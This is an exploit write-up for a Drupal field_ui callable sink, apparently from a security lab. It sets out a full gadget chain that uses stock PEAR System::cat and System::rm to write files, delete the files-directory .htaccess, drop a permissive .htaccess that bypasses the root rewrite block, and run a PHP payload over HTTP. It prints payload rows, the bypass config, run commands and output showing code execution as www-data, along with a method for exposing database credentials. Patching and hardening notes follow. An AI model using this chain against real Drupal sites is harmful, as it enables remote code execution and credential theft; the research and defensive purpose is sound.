# F1 — the full gadget chain: from `#region_callback` to PHP execution

Companion to [F1-field-ui-rce.md](F1-field-ui-rce.md). That document stops at
"an arbitrary callable runs". This one carries it to **executed PHP over
HTTP**, using nothing but stock Drupal/vendor code.

**Status:** reproduced end to end in the local lab against Drupal **11.4.9**.
Both PEAR gadgets used here ship with `drupal/core-recommended` — nothing was
added to the lab.

---

## 1. Recap of the sink

`core/modules/field_ui/src/Element/FieldUiTable.php:72`

```php
$region_name = call_user_func_array($row['#region_callback'], [&$row]);
```

One argument, the row, by reference. No validation of the callable. Fixed in
11.4.10 by removing the dispatch entirely.

The genuine exploit needs a contributed/custom module that lets an HTTP actor
influence `#region_callback`. That module is unnamed in public research and
this lab uses a synthetic stand-in (`lab/modules/vulnlab_field_ui`). Everything
below is therefore a *capability* demonstration: it shows what the sink is
worth once such a writer exists.

## 2. Why not just `system($row)`?

Because the argument is an **array**, and PHP 8 string-argument builtins
(`system`, `exec`, `shell_exec`, …) throw a `TypeError` when handed one:

```
system(): Argument #1 ($command) must be of type string, array given
```

The useful shape is a callable that **consumes row content** rather than a
single string. Stock PEAR provides exactly that.

## 3. The gadgets

`vendor/pear/pear-core-minimal` is a dependency of `drupal/core-recommended`,
so it is present in every stock install:

```json
// composer.lock
{ "name": "pear/pear-core-minimal", "version": "v1.10.18" }
```

### 3.1 `System::cat` — read/copy/write

`vendor/pear/pear-core-minimal/src/System.php:323`

```php
public static function &cat($args)
{
    $ret = null;
    $files = array();
    if (!is_array($args)) {
        $args = preg_split('/\s+/', $args, -1, PREG_SPLIT_NO_EMPTY);
    }

    $count_args = count($args);
    for ($i = 0; $i < $count_args; $i++) {
        if ($args[$i] == '>') {           // <-- numeric index
            $mode = 'wb';
            $outputfile = $args[$i+1];
            break;
        } elseif ($args[$i] == '>>') {
            ...
```

It iterates with a **numeric index**. String-keyed row entries
(`'#region_callback'`, `'region'`, `'weight'`, …) are therefore invisible to
it, while numeric-keyed entries are read as tokens:

```php
$row = [
  '#region_callback' => 'System::cat',   // string key: ignored
  0 => '/path/source',                    // tokens
  1 => '>',
  2 => '/path/destination',
];
```

which is `cat /path/source > /path/destination` — an arbitrary **file write**
(and, by copying `settings.php` somewhere readable, an arbitrary **file read**).

The `>` is what makes this work: the loop `break`s before it runs past the
numeric keys and trips over the string-keyed render elements.

### 3.2 `System::rm` — delete

`vendor/pear/pear-core-minimal/src/System.php:210`

```php
public static function rm($args)
{
    $opts = System::_parseArgs($args, 'rf');
    ...
    foreach ($struct['files'] as $file) {
        if (!@unlink($file)) { $ret = false; }
```

`_parseArgs()` walks **every** row value, so any array value reaches
`is_dir()`/`unlink()` and throws:

```
TypeError: is_dir(): Argument #1 ($filename) must be of type string, array given
```

The workaround is a **string callable** and a row that contains only strings:

```php
$row = [
  '#region_callback' => 'System::rm',
  0 => '-r',
  1 => '/path/to/file',
];
```

Core tolerates the missing render elements — the lookups emit
`Undefined array key` warnings, not errors — which is what makes the minimal
row work.

## 4. The `.htaccess` step (and why it is needed)

Drupal ships `sites/default/files/.htaccess` mode **0444**:

```apache
# Turn off all options we don't need.
Options -Indexes -ExecCGI -Includes -MultiViews

# Set the catch-all handler to prevent scripts from being executed.
SetHandler Drupal_Security_Do_Not_Remove_See_SA_2006_006
<Files *>
  SetHandler Drupal_Security_Do_Not_Remove_See_SA_2013_003
</Files>

<IfModule mod_php.c>
  php_flag engine off
</IfModule>
```

Deleting it directly is not possible (0444), **but the directory is writable**,
so `unlink()` succeeds — and that is exactly the `rm` step.

Even with that file gone, Drupal's **root** `.htaccess` still blocks PHP in
subdirectories:

```apache
# For security reasons, deny access to other PHP files on public sites.
RewriteCond %{REQUEST_URI} !/core/[^/]*\.php$
...
RewriteRule "^(.+/.*|autoload)\.php($|/)" - [F]
```

That `[F]` is what returns **403** for `sites/default/files/payload.php`.
The bypass is a per-directory `RewriteEngine On`: it replaces the per-dir
rewrite rule set for that directory, so the parent's `[F]` no longer applies:

```apache
RewriteEngine On
php_flag engine on
Require all granted
```

`php_flag engine on` then re-enables the PHP handler for the directory.

## 5. The chain, end to end

```
a) stage a PHP payload and a permissive .htaccess outside the executable
   path (in a real attack: an unauthenticated upload, e.g. a webform with a
   private-file field)
b) sink -> System::cat  : payload      -> sites/default/files/vulnlab_payload.php
c) sink -> System::rm   : delete         sites/default/files/.htaccess
d) sink -> System::cat  : .htaccess    -> sites/default/files/.htaccess
e) GET /sites/default/files/vulnlab_payload.php -> PHP executes
```

Observed, verbatim:

```
[*] sink 1: System::cat  payload -> sites/default/files/
    payload written: YES (120 bytes)
[*] sink 2: System::rm   sites/default/files/.htaccess
    .htaccess removed: YES
[*] sink 3: System::cat  permissive .htaccess -> sites/default/files/
    .htaccess now: RewriteEngine On | php_flag engine on | Require all granted

=== RESULT ===
payload executed locally : VULNLAB_RCE_OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

and over HTTP:

```console
$ curl 'http://localhost:8080/sites/default/files/vulnlab_payload.php'
VULNLAB_RCE_OK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Cleanup restores the original `.htaccess`, removes the payload, and the path
returns to 404:

```console
$ php lab/standalone/f1_gadget_chain.php /path/to/project --cleanup
[*] restored sites/default/files/.htaccess
[*] removed the staged payload
$ curl -o /dev/null -w '%{http_code}\n' https://lab/sites/default/files/vulnlab_payload.php
404
```

## 6. Running it

```bash
# against a lab project (drupal/recommended-project layout)
php lab/standalone/f1_gadget_chain.php /path/to/project

# run as the web user, then verify over HTTP, then clean up
./lab/scripts/f1-chain.sh
```

`f1-chain.sh` copies the witness into the running `web` container, executes it
as `www-data`, verifies the HTTP response contains `VULNLAB_RCE_OK`, and always
runs the cleanup step.

> **The chain must run as the web server user.** If it runs as root, the proof
> is weaker: the Drupal files directory is owned by `www-data`, and so is the
> real attack surface.

## 7. Why this matters beyond "we can write a file"

* **Confidentiality** — `System::cat` with `settings.php > public.txt` copies
  the database credentials into a web-readable path.
* **Integrity / availability** — arbitrary file overwrite in the docroot.
* **RCE** — the `.htaccess` step turns a file write into code execution.

## 8. Defensive notes

1. **Patch to 11.4.10** (or 11.3.19 / 10.6.19). The sink no longer dispatches.
2. Until then, **uninstall `field_ui`** — the advisory's own mitigation.
3. Audit any module that implements `hook_form_alter()` for
   `entity_view_display_edit_form` / `entity_form_display_edit_form` and check
   what it puts into `#region_callback`.
4. Harden the files directory beyond Drupal's default:
   * mount `sites/default/files` with `noexec`;
   * keep `AllowOverride` at the minimum your site needs — note that this
     chain relies on `php_flag`/`RewriteEngine` being allowed in `.htaccess`;
   * monitor writes to `sites/default/files/.htaccess`.
5. Log and alert on `#region_callback` values that are strings or arrays
   containing PEAR class names.

## 9. Honest scope statement

The sink is real, the gadgets are stock, and the chain works — but the
**trigger** (`#region_callback` written from an HTTP actor) requires a module
that is still unnamed publicly. Treat this as a capability demonstration, not
as a one-request exploit against an arbitrary Drupal site.
